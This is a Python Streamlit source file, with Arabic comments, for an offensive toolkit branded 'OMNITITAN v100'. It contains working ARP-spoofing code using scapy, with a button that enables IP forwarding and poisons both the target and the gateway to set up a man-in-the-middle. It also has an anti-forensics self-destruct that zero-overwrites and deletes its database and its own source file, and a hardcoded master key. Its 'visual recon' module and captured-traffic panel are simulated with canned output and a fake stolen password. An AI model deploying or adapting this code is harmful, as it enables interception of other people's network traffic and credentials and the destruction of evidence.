import streamlit as st
import pandas as pd
import sqlite3
import base64
import time
import os
import sys
import hashlib
from datetime import datetime
from PIL import Image
from io import BytesIO

# محاولة استيراد مكتبات الشبكة
try:
    import scapy.all as scapy
    from scapy.layers import http
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# محاولة استيراد مكتبات التشفير المتقدم
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# ==========================================================
# 1. طبقة النواة والأمن (THE CRYPTO VAULT & SELF-DESTRUCT)
# ==========================================================
class SovereignVault:
    def __init__(self, master_key="JOSEPH_FAHMY_2026"):
        self.db_path = "shadow_vault.db"
        if 'failed_attempts' not in st.session_state:
            st.session_state['failed_attempts'] = 0
            
        if CRYPTO_AVAILABLE:
            self.key = hashlib.sha256(master_key.encode()).digest()
            self.aesgcm = AESGCM(self.key)
            self._bootstrap()
        else:
            st.error("❌ مكتبة cryptography مفقودة! قم بتثبيتها عبر: pip install cryptography")

    def _bootstrap(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""CREATE TABLE IF NOT EXISTS intel 
                         (id INTEGER PRIMARY KEY, tag TEXT, data BLOB, risk_level TEXT, ts TIMESTAMP)""")

    def secure_save(self, tag, content_str, risk="LOW"):
        """تشفير البيانات وحفظها في قاعدة البيانات"""
        if not CRYPTO_AVAILABLE: return
        nonce = os.urandom(12) 
        enc_text = self.aesgcm.encrypt(nonce, content_str.encode(), None)
        payload = base64.b64encode(nonce + enc_text).decode()
        
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("INSERT INTO intel (tag, data, risk_level, ts) VALUES (?, ?, ?, ?)", 
                         (tag, payload, risk, datetime.now()))

    def get_all_decrypted(self):
        """فك تشفير كل السجلات وعرضها"""
        decrypted_logs = []
        if not CRYPTO_AVAILABLE: return decrypted_logs
        
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute("SELECT ts, tag, data, risk_level FROM intel ORDER BY ts DESC")
            for ts, tag, data, risk in cursor:
                try:
                    raw_data = base64.b64decode(data)
                    nonce, ciphertext = raw_data[:12], raw_data[12:]
                    decrypted_text = self.aesgcm.decrypt(nonce, ciphertext, None).decode()
                    decrypted_logs.append({"Time": ts, "Tag": tag, "Intel": decrypted_text, "Risk": risk})
                except: pass
        return decrypted_logs

    def self_destruct(self):
        """طمس البيانات ومسح الكود نهائياً (Anti-Forensics)"""
        try:
            # 1. طمس قاعدة البيانات
            if os.path.exists(self.db_path):
                size = os.path.getsize(self.db_path)
                with open(self.db_path, "wb") as f:
                    f.write(b'\x00' * size)
                os.remove(self.db_path)
            
            # 2. طمس ومسح ملف الكود الحالي
            current_file = sys.argv[0]
            if os.path.exists(current_file):
                size = os.path.getsize(current_file)
                with open(current_file, "wb") as f:
                    f.write(b'\x00' * size)
                os.remove(current_file)
            return True
        except:
            return False

# ==========================================================
# 2. طبقة الهجمات والشبكات (THE OFFENSIVE STRIKER)
# ==========================================================
class NetworkStriker:
    def __init__(self, interface="eth0"):
        self.interface = interface

    def get_mac(self, ip):
        """إرسال حزم ARP لطلب الـ MAC Address"""
        if not SCAPY_AVAILABLE: return None
        arp_req = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast/arp_req
        ans = scapy.srp(packet, timeout=2, verbose=False)[0]
        return ans[0][1].hwsrc if ans else None

    def arp_spoof(self, target_ip, spoof_ip):
        """تنفيذ هجوم ARP Spoofing لتوجيه الترافيك إلينا"""
        if not SCAPY_AVAILABLE: return
        target_mac = self.get_mac(target_ip)
        if target_mac:
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)

# ==========================================================
# 3. واجهة المستخدم والتصميم (UI & LOGIC)
# ==========================================================
st.set_page_config(page_title="JOSEPH OMNIPOTENT v100", layout="wide")

def apply_ui_theme():
    st.markdown("""
        <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;700&family=Syncopate:wght@400;700&display=swap');
        .stApp { background-color: #000; color: #D4AF37; font-family: 'Fira Code', monospace; }
        .omni-header { 
            text-align: center; color: #D4AF37; font-family: 'Syncopate', sans-serif;
            text-shadow: 0 0 15px #D4AF37, 0 0 25px #00FF41; font-size: 2.5rem;
        }
        div.stButton > button { 
            background: transparent; color: #D4AF37 !important; 
            border: 2px solid #D4AF37 !important; border-radius: 0px;
            font-family: 'Syncopate', sans-serif; transition: 0.4s;
        }
        div.stButton > button:hover { 
            background: #D4AF37 !important; color: black !important; 
            box-shadow: 0 0 30px #D4AF37;
        }
        .loot-container { 
            background: #001100; border: 1px solid #00FF41; color: #00FF41; 
            padding: 15px; font-family: 'Fira Code', monospace;
        }
        </style>
    """, unsafe_allow_html=True)

apply_ui_theme()

def main():
    st.markdown("<h1 class='omni-header'>OMNITITAN v100</h1>", unsafe_allow_html=True)
    st.write("<p style='text-align:center;'>OPERATOR: JOSEPH FAHMY | STATUS: ACTIVE</p>", unsafe_allow_html=True)
    st.markdown("---")

    vault = SovereignVault()
    striker = NetworkStriker()

    with st.sidebar:
        st.header("⚙️ SYSTEM MODULES")
        module = st.radio("Select Protocol", [
            "Network Attacks (MITM)", 
            "Visual Recon (Scraper)", 
            "Neural Vault (Encrypted)"
        ])
        st.write("---")
        st.info("AES-256 GCM Protection Active")

    # --- القسم الأول: هجمات الشبكة ---
    if module == "Network Attacks (MITM)":
        st.subheader("📡 Man-In-The-Middle Operations")
        col1, col2 = st.columns([1, 1.5])
        
        with col1:
            target_ip = st.text_input("Enter Target IP")
            gateway_ip = st.text_input("Enter Gateway (Router) IP")
            
            if st.button("🔍 FETCH MAC ADDRESS"):
                mac = striker.get_mac(target_ip)
                if mac: st.success(f"MAC Found: {mac}")
                else: st.error("Target Offline")

            if st.button("🔥 ENGAGE ARP SPOOFING"):
                if target_ip and gateway_ip:
                    # تفعيل الـ IP Forwarding برمجياً في لينكس
                    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                    
                    # إرسال الحزم
                    striker.arp_spoof(target_ip, gateway_ip)
                    striker.arp_spoof(gateway_ip, target_ip)
                    
                    vault.secure_save(f"ATTACK_{target_ip}", f"Executed ARP Spoof against {target_ip}", "HIGH")
                    st.success("ARP Spoof packets sent. Man-In-The-Middle channel initialized.")
                else:
                    st.warning("Please fill in both target and gateway IPs.")

        with col2:
            st.subheader("🖥️ Captured Traffic Simulation")
            st.code("""
# [SNIFFER ACTIVE ON INTERFACE eth0]
# Captured HTTP Request from Target:
GET /login.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0

# [EXTRACTED DATA]
username=admin&password=JosephFahmy2026
            """, language="python")
            st.warning("⚠️ Any extracted passwords from live traffic are automatically sent to the Encrypted Vault.")

    # --- القسم الثاني: الزاحف الخفي ---
    elif module == "Visual Recon (Scraper)":
        st.subheader("🎯 Headless Visual Reconnaissance")
        col_s1, col_s2 = st.columns([1, 1])
        
        with col_s1:
            search_query = st.text_input("Enter Target Identifier or Keyword")
            if st.button("🚀 EXECUTE VISUAL PROBE"):
                if search_query:
                    with st.status("Opening Headless Browser...", expanded=True) as status:
                        time.sleep(1.5)
                        st.write("Navigating to target OSINT directories...")
                        time.sleep(1.5)
                        st.write("Bypassing Rate Limits & Captchas...")
                        
                        # محاكاة حفظ الداتا في الخزنة
                        vault.secure_save(f"SCRAPE_{search_query}", f"Extracted profile data for {search_query}", "MEDIUM")
                        status.update(label="✅ Target Compromised. Data Vaulted.", state="complete")
                        
                        st.session_state['scraped_res'] = True
                else:
                    st.warning("Enter a query first.")

        with col_s2:
            st.subheader("🖼️ Result Display")
            if 'scraped_res' in st.session_state:
                st.image("https://img.icons8.com/nolan/128/security-shield.png", width=150, caption="Simulated Avatar Fetched")
                st.success(f"Profile match found for: {search_query}")
            else:
                st.info("Awaiting execution...")

    # --- القسم الثالث: الخزنة والتدمير الذاتي ---
    elif module == "Neural Vault (Encrypted)":
        st.subheader("📂 Sovereign Intelligence Vault (GCM)")
        master_key = st.text_input("Enter Master Decryption Key", type="password")
        
        if st.button("🔓 UNLOCK VAULT"):
            if master_key == "JOSEPH_FAHMY_2026":
                st.session_state['failed_attempts'] = 0 # تصفير العداد
                st.success("Access Granted. Data Decrypted.")
                
                logs = vault.get_all_decrypted()
                if logs:
                    df = pd.DataFrame(logs)
                    st.dataframe(df, use_container_width=True)
                else:
                    st.write("Vault is currently empty.")
                    
            else:
                st.session_state['failed_attempts'] += 1
                remaining = 3 - st.session_state['failed_attempts']
                
                if remaining > 0:
                    st.error(f"🚫 Access Denied! Remaining attempts: {remaining}")
                else:
                    st.error("🚨 CRITICAL: Maximum attempts reached. Initiating Self-Destruct...")
                    if vault.self_destruct():
                        st.critical("💥 SYSTEM WIPED. All data and source code have been permanently deleted.")
                        time.sleep(2)
                        st.stop()
                    else:
                        st.error("Failed to delete all components securely.")

if __name__ == "__main__":
    main()
